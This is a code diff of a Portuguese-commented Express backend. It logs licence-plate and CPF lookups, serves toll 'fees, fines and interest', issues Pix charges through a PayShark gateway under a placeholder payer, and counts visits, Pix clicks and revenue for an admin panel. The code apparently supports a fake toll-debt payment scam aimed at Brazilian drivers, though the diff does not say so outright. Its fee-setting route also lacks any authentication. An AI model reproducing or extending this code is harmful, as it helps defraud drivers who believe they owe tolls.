@@ -73,14 +73,14 @@ app.get('/api/config', (req, res) => {
     });
 });
 
-// 2. ROTA PARA REGISTRAR ACESSO À TELA (Alimenta "Acessos à Tela" no Admin)
+// 2. ROTA PARA REGISTRAR ACESSO À TELA
 app.post(['/api/registrar-acesso', '/api/acesso'], async (req, res) => {
     try {
         const stats = (await getFirebaseNode('stats')) || {};
         const acessosAtuais = Number(stats.acessos || stats.acessos_tela || 0) + 1;
         
         await updateFirebaseNode('stats', { acessos: acessosAtuais, acessos_tela: acessosAtuais });
-        await updateFirebaseNode('metricas', { acessos: acessosAtuais });
+        await updateFirebaseNode('metricas', { acessos: acessosAtuais, views: acessosAtuais });
 
         return res.json({ status: true, acessos: acessosAtuais });
     } catch (err) {
@@ -88,7 +88,36 @@ app.post(['/api/registrar-acesso', '/api/acesso'], async (req, res) => {
     }
 });
 
-// 3. ROTA PARA GERAR PIX (PayShark + Registro no Admin/Firebase)
+// 3. ROTA PARA REGISTRAR CONSULTA DE PLACA/CPF (Garante salvamento no Firebase)
+app.post('/api/registrar-consulta', async (req, res) => {
+    try {
+        const { placa, valor, tipo_busca } = req.body || {};
+        if (!placa) return res.status(400).json({ status: false, error: 'Placa/CPF obrigatório' });
+
+        const chaveLimpa = String(placa).replace(/[^A-Z0-9]/g, '').toUpperCase();
+        const dataAgoraIso = new Date().toISOString();
+        const dataAgoraFmt = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+
+        const dadosVeiculo = {
+            placa: chaveLimpa,
+            valor: Number(valor || 33.90),
+            status: 'pendente',
+            tipo_busca: tipo_busca || (chaveLimpa.length === 11 ? 'cpf' : 'placa'),
+            data_consulta: dataAgoraIso,
+            criado_em: dataAgoraFmt,
+            data: dataAgoraFmt
+        };
+
+        await updateFirebaseNode(`veiculos/${chaveLimpa}`, dadosVeiculo);
+        await updateFirebaseNode(`transacoes/${chaveLimpa}`, dadosVeiculo);
+
+        return res.json({ status: true, data: dadosVeiculo });
+    } catch (err) {
+        return res.status(500).json({ status: false, error: err.message });
+    }
+});
+
+// 4. ROTA PARA GERAR PIX (PayShark + Registro no Admin/Firebase)
 app.post(['/api/gerar-pix', '/gerar-pix', '/api/gerar_pix.php', '/gerar_pix.php'], async (req, res) => {
     try {
         const dadosEntrada = req.body || {};
@@ -113,7 +142,7 @@ app.post(['/api/gerar-pix', '/gerar-pix', '/api/gerar_pix.php', '/gerar_pix.php'
         const doc = String(process.env.PIX_GATEWAY_CLIENT_DOCUMENT || '01387220055').replace(/\D/g, '');
         const phone = String(process.env.PIX_GATEWAY_CLIENT_PHONE || '11999999999').replace(/\D/g, '');
         const email = String(process.env.PIX_GATEWAY_CLIENT_EMAIL || 'teste@teste.com').trim();
-        const placa = String(dadosEntrada.placa || 'CONSULTA').trim().toUpperCase();
+        const placa = String(dadosEntrada.placa || 'CONSULTA').replace(/[^A-Z0-9]/g, '').toUpperCase();
         const name = process.env.PIX_GATEWAY_CLIENT_NAME || (placa ? `Pedágio ${placa}` : 'Cliente Pedágio');
         const postbackUrl = process.env.PIX_GATEWAY_CALLBACK_URL || '';
 
@@ -174,29 +203,32 @@ app.post(['/api/gerar-pix', '/gerar-pix', '/api/gerar_pix.php', '/gerar_pix.php'
                 qrcodeBase64 = dataUrl.replace(/^data:image\/[^;]+;base64,/, '');
             } catch (qrErr) {}
 
-            const dataAgora = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+            const dataAgoraIso = new Date().toISOString();
+            const dataAgoraFmt = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
 
-            // 1. Salva a transação como PENDENTE no Firebase (aparece na tabela do Admin)
+            // Salva a transação como PENDENTE no Firebase com todos os campos unificados
             const dadosTransacao = {
                 placa: placa,
                 cpf: doc,
                 tipo: 'Pix',
+                tipo_busca: dadosEntrada.modelo_carro ? (dadosEntrada.modelo_carro.includes('CPF') ? 'cpf' : 'placa') : 'placa',
                 valor: valorReais,
                 valor_formatado: `R$ ${valorReais.toFixed(2).replace('.', ',')}`,
                 status: 'pendente',
-                criado_em: dataAgora,
-                data: dataAgora,
+                criado_em: dataAgoraFmt,
+                data: dataAgoraFmt,
+                data_consulta: dataAgoraIso,
                 txid: tx.id || payload.externalRef
             };
 
             await updateFirebaseNode(`veiculos/${placa}`, dadosTransacao);
             await updateFirebaseNode(`transacoes/${placa}`, dadosTransacao);
 
-            // 2. Incrementa o contador "Cliques no Pix" no Firebase
+            // Incrementa o contador "Cliques no Pix" no Firebase
             const stats = (await getFirebaseNode('stats')) || {};
-            const cliquesAtuais = Number(stats.cliques_pix || stats.cliques || 0) + 1;
+            const cliquesAtuais = Number(stats.cliques_pix || stats.cliques || stats.clicks || 0) + 1;
             await updateFirebaseNode('stats', { cliques_pix: cliquesAtuais, cliques: cliquesAtuais });
-            await updateFirebaseNode('metricas', { cliques_pix: cliquesAtuais });
+            await updateFirebaseNode('metricas', { cliques_pix: cliquesAtuais, clicks: cliquesAtuais });
 
             return res.json({
                 status: true,
@@ -224,9 +256,12 @@ app.post(['/api/gerar-pix', '/gerar-pix', '/api/gerar_pix.php', '/gerar_pix.php'
     }
 });
 
-// 4. ROTA PARA TAXAS DO SISTEMA (Salvar/Buscar do Admin)
+// 5. ROTA PARA TAXAS DO SISTEMA
 app.get('/api/taxas', async (req, res) => {
-    const taxas = (await getFirebaseNode('taxas')) || {
+    const taxas = (await getFirebaseNode('configuracoes/taxas')) || (await getFirebaseNode('taxas')) || {
+        base: 14.50,
+        fine: 15.00,
+        interest: 4.40,
         tarifa_base: 14.50,
         multa_adm: 15.00,
         juros_mora: 4.40
@@ -236,11 +271,12 @@ app.get('/api/taxas', async (req, res) => {
 
 app.post('/api/taxas', async (req, res) => {
     const novasTaxas = req.body || {};
-    await updateFirebaseNode('taxas', novasTaxas, 'SET');
+    await updateFirebaseNode('configuracoes/taxas', novasTaxas, 'PATCH');
+    await updateFirebaseNode('taxas', novasTaxas, 'PATCH');
     return res.json({ status: true, message: "Taxas atualizadas com sucesso" });
 });
 
-// 5. ROTA DE WEBHOOK (Atualiza Status para PAGO e aumenta Faturamento no Admin)
+// 6. ROTA DE WEBHOOK
 app.post('/api/webhook', async (req, res) => {
     try {
         const dados = req.body;
@@ -267,11 +303,9 @@ app.post('/api/webhook', async (req, res) => {
             if (chaveLimpa && chaveLimpa.length >= 7) {
                 const dataAgora = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
 
-                // Atualiza status no Firebase para PAGO
                 await updateFirebaseNode(`veiculos/${chaveLimpa}`, { status: "pago", pago_em: dataAgora });
                 await updateFirebaseNode(`transacoes/${chaveLimpa}`, { status: "pago", pago_em: dataAgora });
 
-                // Soma o valor pago no faturamento total
                 const valorPago = Number(dados.amount || dados.paidAmount || 0) / (dados.amount > 1000 ? 100 : 1);
                 const stats = (await getFirebaseNode('stats')) || {};
                 const faturamentoAtual = Number(stats.faturamento || 0) + (valorPago || 0);
